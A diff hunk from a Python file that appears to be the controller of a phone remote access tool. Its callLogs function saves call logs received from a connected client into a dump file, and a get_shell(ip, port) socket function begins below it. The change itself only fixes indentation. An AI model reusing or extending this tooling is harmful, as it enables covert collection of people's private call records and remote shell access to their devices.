@@ -282,16 +282,16 @@ def callLogs(client):
     msg = recvall(client)
     filename = "Dumps"+direc+"Call_Logs_"+timestr+'.txt'
     if "No call logs" in msg:
-    	msg.split("\n")
+        msg.split("\n")
         print(msg.replace("END123","").strip())
-    	print(" ")
+        print(" ")
     else:
     	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
-    		txt.write(msg)
-    		txt.close()
-    		print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
-    		if not os.path.getsize(filename):
-    			os.remove(filename)
+            txt.write(msg)
+            txt.close()
+            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
+            if not os.path.getsize(filename):
+                os.remove(filename)
 
 def get_shell(ip,port):
     soc = socket.socket() 
